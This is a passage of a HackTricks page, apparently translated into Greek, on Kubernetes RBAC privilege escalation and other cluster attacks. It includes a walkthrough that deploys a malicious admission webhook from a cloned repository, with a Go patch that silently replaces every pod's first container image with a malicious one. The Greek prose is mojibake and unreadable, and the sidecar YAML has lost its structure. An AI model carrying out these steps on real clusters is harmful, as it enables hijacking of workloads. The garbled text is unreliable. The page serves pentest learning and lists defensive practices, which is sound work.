ÎŸÎ¹ ÎºÏÏÎ¹Î¿Î¹ Î¼Îµ **`update`** Î® **`patch`** Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Ï€Î¬Î½Ï‰ ÏƒÎµ `nodes/status` Î® `pods/status`, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î½ Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½ ÎµÏ„Î¹ÎºÎ­Ï„ÎµÏ‚ Î³Î¹Î± Î½Î± ÎµÏ€Î·ÏÎµÎ¬ÏƒÎ¿Ï…Î½ Ï„Î¿Ï…Ï‚ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î¿ÏÏ‚ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÎ¼Î¿Ï Ï€Î¿Ï… ÎµÏ€Î¹Î²Î¬Î»Î»Î¿Î½Ï„Î±Î¹.

## Î•Î½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¼Î­Î½Î· Î ÏÏŒÎ»Î·ÏˆÎ· ÎšÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ·Ï‚ Î”Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½

Î¤Î¿ Kubernetes Î´Î¹Î±Î¸Î­Ï„ÎµÎ¹ Î­Î½Î±Î½ [ÎµÎ½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¼Î­Î½Î¿ Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼ÏŒ](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) Î³Î¹Î± Ï„Î·Î½ Ï€ÏÏŒÎ»Î·ÏˆÎ· Ï„Î·Ï‚ ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ·Ï‚ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½.

Î‘Ï…Ï„ÏŒ Ï„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± Î´Î¹Î±ÏƒÏ†Î±Î»Î¯Î¶ÎµÎ¹ ÏŒÏ„Î¹ **Î¿Î¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î±Ï…Î¾Î®ÏƒÎ¿Ï…Î½ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î¬ Ï„Î¿Ï…Ï‚ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ ÏÏŒÎ»Î¿Ï…Ï‚ Î® Î´ÎµÏƒÎ¼ÎµÏÏƒÎµÎ¹Ï‚ ÏÏŒÎ»Ï‰Î½**. Î— ÎµÏ€Î¹Î²Î¿Î»Î® Î±Ï…Ï„Î¿Ï Ï„Î¿Ï… ÎºÎ±Î½ÏŒÎ½Î± ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ ÏƒÎµ ÎµÏ€Î¯Ï€ÎµÎ´Î¿ API, Ï€Î±ÏÎ­Ï‡Î¿Î½Ï„Î±Ï‚ Î¼Î¹Î± Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯Î± Î±ÎºÏŒÎ¼Î· ÎºÎ±Î¹ ÏŒÏ„Î±Î½ Î¿ RBAC authorizer ÎµÎ¯Î½Î±Î¹ Î±Î½ÎµÎ½ÎµÏÎ³ÏŒÏ‚.

ÎŸ ÎºÎ±Î½ÏŒÎ½Î±Ï‚ stipulates ÏŒÏ„Î¹ Î­Î½Î±Ï‚ **Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î® Î½Î± ÎµÎ½Î·Î¼ÎµÏÏÏƒÎµÎ¹ Î­Î½Î±Î½ ÏÏŒÎ»Î¿ Î¼ÏŒÎ½Î¿ ÎµÎ¬Î½ ÎºÎ±Ï„Î­Ï‡ÎµÎ¹ ÏŒÎ»Î± Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Ï€Î¿Ï… Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Î¿ ÏÏŒÎ»Î¿Ï‚**. Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Ï„Î¿ ÎµÏÏÎ¿Ï‚ Ï„Ï‰Î½ Ï…Ï†Î¹ÏƒÏ„Î¬Î¼ÎµÎ½Ï‰Î½ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÏ…Î¸Ï…Î³ÏÎ±Î¼Î¼Î¯Î¶ÎµÏ„Î±Î¹ Î¼Îµ Î±Ï…Ï„ÏŒ Ï„Î¿Ï… ÏÏŒÎ»Î¿Ï… Ï€Î¿Ï… Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î® Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹: ÎµÎ¯Ï„Îµ ÏƒÎµ ÎµÏ€Î¯Ï€ÎµÎ´Î¿ cluster Î³Î¹Î± ClusterRoles ÎµÎ¯Ï„Îµ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿ ÏƒÏ„Î·Î½ Î¯Î´Î¹Î± namespace (Î® cluster-wide) Î³Î¹Î± Roles.

{% hint style="warning" %}
Î¥Ï€Î¬ÏÏ‡ÎµÎ¹ Î¼Î¹Î± ÎµÎ¾Î±Î¯ÏÎµÏƒÎ· ÏƒÏ„Î¿Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿ ÎºÎ±Î½ÏŒÎ½Î±. Î•Î¬Î½ Î­Î½Î±Ï‚ ÎºÏÏÎ¹Î¿Ï‚ Î­Ï‡ÎµÎ¹ Ï„Î¿ **ÏÎ®Î¼Î± `escalate`** Ï€Î¬Î½Ï‰ ÏƒÎµ **`roles`** Î® **`clusterroles`** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Ï…Î¾Î®ÏƒÎµÎ¹ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Ï„Ï‰Î½ ÏÏŒÎ»Ï‰Î½ ÎºÎ±Î¹ Ï„Ï‰Î½ clusterroles Î±ÎºÏŒÎ¼Î· ÎºÎ±Î¹ Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Î­Ï‡ÎµÎ¹ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î¿ Î¯Î´Î¹Î¿Ï‚.
{% endhint %}

### **Î›Î¬Î²ÎµÏ„Îµ & Î•Î½Î·Î¼ÎµÏÏÏƒÏ„Îµ RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**Î¦Î±Î¯Î½ÎµÏ„Î±Î¹ ÏŒÏ„Î¹ Î±Ï…Ï„Î® Î· Ï„ÎµÏ‡Î½Î¹ÎºÎ® Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¿ÏÏƒÎµ Ï€ÏÎ¹Î½, Î±Î»Î»Î¬ ÏƒÏÎ¼Ï†Ï‰Î½Î± Î¼Îµ Ï„Î¹Ï‚ Î´Î¿ÎºÎ¹Î¼Î­Ï‚ Î¼Î¿Ï… Î´ÎµÎ½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Ï€Î¹Î± Î³Î¹Î± Ï„Î¿Î½ Î¯Î´Î¹Î¿ Î»ÏŒÎ³Î¿ Ï€Î¿Ï… ÎµÎ¾Î·Î³Î®Î¸Î·ÎºÎµ ÏƒÏ„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· ÎµÎ½ÏŒÏ„Î·Ï„Î±. Î”ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ/Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î­Î½Î± rolebinding Î³Î¹Î± Î½Î± Î´ÏÏƒÎµÏ„Îµ ÏƒÏ„Î¿Î½ ÎµÎ±Ï…Ï„ÏŒ ÏƒÎ±Ï‚ Î® ÏƒÎµ Î­Î½Î±Î½ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏŒ SA ÎºÎ¬Ï€Î¿Î¹Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î±Î½ Î´ÎµÎ½ Î­Ï‡ÎµÏ„Îµ Î®Î´Î·.**
{% endhint %}

Î¤Î¿ Î´Î¹ÎºÎ±Î¯Ï‰Î¼Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Rolebindings ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÎµ Î­Î½Î±Î½ Ï‡ÏÎ®ÏƒÏ„Î· Î½Î± **Î´ÎµÏƒÎ¼ÎµÏÏƒÎµÎ¹ ÏÏŒÎ»Î¿Ï…Ï‚ ÏƒÎµ Î­Î½Î±Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚**. Î‘Ï…Ï„ÏŒ Ï„Î¿ Î´Î¹ÎºÎ±Î¯Ï‰Î¼Î± Î¼Ï€Î¿ÏÎµÎ¯ Î´Ï…Î½Î·Ï„Î¹ÎºÎ¬ Î½Î± Î¿Î´Î·Î³Î®ÏƒÎµÎ¹ ÏƒÎµ ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ ÎµÏ€ÎµÎ¹Î´Î® **ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· Î½Î± Î´ÎµÏƒÎ¼ÎµÏÏƒÎµÎ¹ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î® ÏƒÎµ Î­Î½Î±Î½ ÏƒÏ…Î¼Î²Î¹Î²Î±ÏƒÎ¼Î­Î½Î¿ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚.**

## Î†Î»Î»ÎµÏ‚ Î•Ï€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚

### Î•Ï†Î±ÏÎ¼Î¿Î³Î® Proxy Sidecar

Î‘Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· ÏƒÏ„Î·Î½ ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± Î¼ÎµÏ„Î±Î¾Ï Ï„Ï‰Î½ pods. Î‘Î¼Î¿Î¹Î²Î±Î¯Î± Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ·, Î±Î¼Ï†Î¯Î´ÏÎ¿Î¼Î·, pod Ï€ÏÎ¿Ï‚ pod.

#### Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Î¼Î¹Î±Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚ proxy sidecar <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Ï„Î¿ .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Î•Ï€ÎµÎ¾ÎµÏÎ³Î±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î¿ .yaml ÏƒÎ±Ï‚ ÎºÎ±Î¹ Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÏ„Îµ Ï„Î¹Ï‚ Î¼Î· ÏƒÏ‡Î¿Î»Î¹Î±ÏƒÎ¼Î­Î½ÎµÏ‚ Î³ÏÎ±Î¼Î¼Î­Ï‚:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Î”ÎµÎ¯Ï„Îµ Ï„Î± Î±ÏÏ‡ÎµÎ¯Î± ÎºÎ±Ï„Î±Î³ÏÎ±Ï†Î®Ï‚ Ï„Î¿Ï… proxy:
```bash
kubectl logs app -C proxy
```
Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ„Î¿: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### ÎšÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿Ï‚ Î•Î»ÎµÎ³ÎºÏ„Î®Ï‚ Î•Î¹ÏƒÏŒÎ´Î¿Ï…

ÎˆÎ½Î±Ï‚ ÎµÎ»ÎµÎ³ÎºÏ„Î®Ï‚ ÎµÎ¹ÏƒÏŒÎ´Î¿Ï… **Ï€Î±ÏÎµÎ¼Î²Î±Î¯Î½ÎµÎ¹ ÏƒÎµ Î±Î¹Ï„Î®Î¼Î±Ï„Î± Ï€ÏÎ¿Ï‚ Ï„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® API Ï„Î¿Ï… Kubernetes** Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Ï„Î·Î½ Î±Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ· Ï„Î¿Ï… Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï…, Î±Î»Î»Î¬ **Î¼ÎµÏ„Î¬ Ï„Î·Î½ Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ·** **ÎºÎ±Î¹ Ï„Î·Î½ ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·** Ï„Î¿Ï… Î±Î¹Ï„Î®Î¼Î±Ï„Î¿Ï‚.

Î•Î¬Î½ Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ ÎºÎ±Ï„Î±Ï†Î­ÏÎµÎ¹ Î¼Îµ ÎºÎ¬Ï€Î¿Î¹Î¿ Ï„ÏÏŒÏ€Î¿ Î½Î± **ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ Î­Î½Î±Î½ ÎšÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ Î•Î»ÎµÎ³ÎºÏ„Î® Î•Î¹ÏƒÏŒÎ´Î¿Ï…**, Î¸Î± ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± **Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Î®Î´Î· Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î± Î±Î¹Ï„Î®Î¼Î±Ï„Î±**. ÎˆÏ‡Î¿Î½Ï„Î±Ï‚ Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±, ÎºÎ±Î¹ Ï€Î¹Î¿ ÏƒÏ…Ï‡Î½Î¬ Î½Î± Ï€Î±ÏÎ±Î¼ÎµÎ¯Î½ÎµÎ¹ ÏƒÏ„Î¿ cluster.

**Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î±Ï€ÏŒ** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
ÎˆÎ»ÎµÎ³Ï‡Î¿Ï‚ Ï„Î·Ï‚ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·Ï‚ Î³Î¹Î± Î½Î± Î´Î¿ÏÎ¼Îµ Î±Î½ ÎµÎ¯Î½Î±Î¹ Î­Ï„Î¿Î¹Î¼Î¿:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î±Î½Î±Ï€Ï„ÏÎ¾Ï„Îµ Î­Î½Î± Î½Î­Î¿ pod:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
ÎŒÏ„Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î¿ ÏƒÏ†Î¬Î»Î¼Î± `ErrImagePull`, ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î·Ï‚ ÎµÎ¹ÎºÏŒÎ½Î±Ï‚ Î¼Îµ Î¼Î¯Î± Î±Ï€ÏŒ Ï„Î¹Ï‚ ÎµÏÏ‰Ï„Î®ÏƒÎµÎ¹Ï‚:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

ÎŒÏ€Ï‰Ï‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½ Ï€Î±ÏÎ±Ï€Î¬Î½Ï‰ ÎµÎ¹ÎºÏŒÎ½Î±, Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎ±Î¼Îµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¿Ï…Î¼Îµ Ï„Î·Î½ ÎµÎ¹ÎºÏŒÎ½Î± `nginx`, Î±Î»Î»Î¬ Î· Ï„ÎµÎ»Î¹ÎºÎ® ÎµÎºÏ„ÎµÎ»Î¿ÏÎ¼ÎµÎ½Î· ÎµÎ¹ÎºÏŒÎ½Î± ÎµÎ¯Î½Î±Î¹ `rewanthtammana/malicious-image`. Î¤Î¹ Î¼ÏŒÎ»Î¹Ï‚ ÏƒÏ…Î½Î­Î²Î·!!;

#### Technicalities <a href="#heading-technicalities" id="heading-technicalities"></a>

Î¤Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ `./deploy.sh` ÎµÎ³ÎºÎ±Î¸Î¹ÏƒÏ„Î¬ Î­Î½Î±Î½ Î¼ÎµÏ„Î±Î²Î±Î»Î»ÏŒÎ¼ÎµÎ½Î¿ ÎµÎ»ÎµÎ³ÎºÏ„Î® ÎµÎ¹ÏƒÏŒÎ´Î¿Ï… webhook, Î¿ Î¿Ï€Î¿Î¯Î¿Ï‚ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î± Î±Î¹Ï„Î®Î¼Î±Ï„Î± Ï€ÏÎ¿Ï‚ Ï„Î¿ Kubernetes API ÏŒÏ€Ï‰Ï‚ ÎºÎ±Î¸Î¿ÏÎ¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¹Ï‚ Î³ÏÎ±Î¼Î¼Î­Ï‚ Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ®Ï‚ Ï„Î¿Ï…, ÎµÏ€Î·ÏÎµÎ¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î± Î±Ï€Î¿Ï„ÎµÎ»Î­ÏƒÎ¼Î±Ï„Î± Ï€Î¿Ï… Ï€Î±ÏÎ±Ï„Î·ÏÎ¿ÏÎ½Ï„Î±Î¹:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
The above snippet replaces the first container image in every pod with `rewanthtammana/malicious-image`.

## OPA Gatekeeper bypass

{% content-ref url="../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md" %}
[kubernetes-opa-gatekeeper-bypass.md](../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md)
{% endcontent-ref %}

## ÎšÎ±Î»Î­Ï‚ Î ÏÎ±ÎºÏ„Î¹ÎºÎ­Ï‚

### **Î‘Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î‘Ï…Ï„ÏŒÎ¼Î±Ï„Î·Ï‚ Î¤Î¿Ï€Î¿Î¸Î­Ï„Î·ÏƒÎ·Ï‚ Î”ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î›Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Î¥Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚**

* **Pods ÎºÎ±Î¹ Î›Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Î¯ Î¥Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚**: Î‘Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, Ï„Î± pods Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î¿ÏÎ½ Î­Î½Î± Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÏŒ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚. Î“Î¹Î± Î½Î± ÎµÎ½Î¹ÏƒÏ‡Ï…Î¸ÎµÎ¯ Î· Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±, Ï„Î¿ Kubernetes ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î·Ï‚ Ï„Î¿Ï€Î¿Î¸Î­Ï„Î·ÏƒÎ·Ï‚.
* **Î ÏÏ‚ Î½Î± Î•Ï†Î±ÏÎ¼ÏŒÏƒÎµÏ„Îµ**: ÎŸÏÎ¯ÏƒÏ„Îµ `automountServiceAccountToken: false` ÏƒÏ„Î· Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· Ï„Ï‰Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏÎ½ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ Î® Ï„Ï‰Î½ pods Î¾ÎµÎºÎ¹Î½ÏÎ½Ï„Î±Ï‚ Î±Ï€ÏŒ Ï„Î·Î½ Î­ÎºÎ´Î¿ÏƒÎ· 1.6 Ï„Î¿Ï… Kubernetes.

### **Î ÎµÏÎ¹Î¿ÏÎ¹ÏƒÏ„Î¹ÎºÎ® Î‘Î½Î¬Î¸ÎµÏƒÎ· Î§ÏÎ·ÏƒÏ„ÏÎ½ ÏƒÎµ RoleBindings/ClusterRoleBindings**

* **Î•Ï€Î¹Î»ÎµÎºÏ„Î¹ÎºÎ® Î£Ï…Î¼Ï€ÎµÏÎ¯Î»Î·ÏˆÎ·**: Î’ÎµÎ²Î±Î¹Ï‰Î¸ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Î¼ÏŒÎ½Î¿ Î¿Î¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î¿Î¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Î½Ï„Î±Î¹ ÏƒÎµ RoleBindings Î® ClusterRoleBindings. Î•Î»Î­Î³Ï‡ÎµÏ„Îµ Ï„Î±ÎºÏ„Î¹ÎºÎ¬ ÎºÎ±Î¹ Î±Ï†Î±Î¹ÏÎ­ÏƒÏ„Îµ Î¼Î· ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¿ÏÏ‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î³Î¹Î± Î½Î± Î´Î¹Î±Ï„Î·ÏÎ®ÏƒÎµÏ„Îµ ÏƒÏ†Î¹Ï‡Ï„Î® Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±.

### **Î¡ÏŒÎ»Î¿Î¹ Î£Ï…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿Î¹ ÏƒÎµ Namespace Î‘Î½Ï„Î¯ Î¡ÏŒÎ»Ï‰Î½ Cluster-Wide**

* **Î¡ÏŒÎ»Î¿Î¹ vs. ClusterRoles**: Î ÏÎ¿Ï„Î¹Î¼Î®ÏƒÏ„Îµ Ï„Î· Ï‡ÏÎ®ÏƒÎ· Î¡ÏŒÎ»Ï‰Î½ ÎºÎ±Î¹ RoleBindings Î³Î¹Î± Î¬Î´ÎµÎ¹ÎµÏ‚ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½ÎµÏ‚ ÏƒÎµ namespace Î±Î½Ï„Î¯ Î³Î¹Î± ClusterRoles ÎºÎ±Î¹ ClusterRoleBindings, Ï€Î¿Ï… Î¹ÏƒÏ‡ÏÎ¿Ï…Î½ ÏƒÎµ ÏŒÎ»Î¿ Ï„Î¿ cluster. Î‘Ï…Ï„Î® Î· Ï€ÏÎ¿ÏƒÎ­Î³Î³Î¹ÏƒÎ· Ï€ÏÎ¿ÏƒÏ†Î­ÏÎµÎ¹ Ï€Î¹Î¿ Î»ÎµÏ€Ï„ÏŒ Î­Î»ÎµÎ³Ï‡Î¿ ÎºÎ±Î¹ Ï€ÎµÏÎ¹Î¿ÏÎ¯Î¶ÎµÎ¹ Ï„Î·Î½ Î­ÎºÏ„Î±ÏƒÎ· Ï„Ï‰Î½ Î±Î´ÎµÎ¹ÏÎ½.

### **Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î±**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
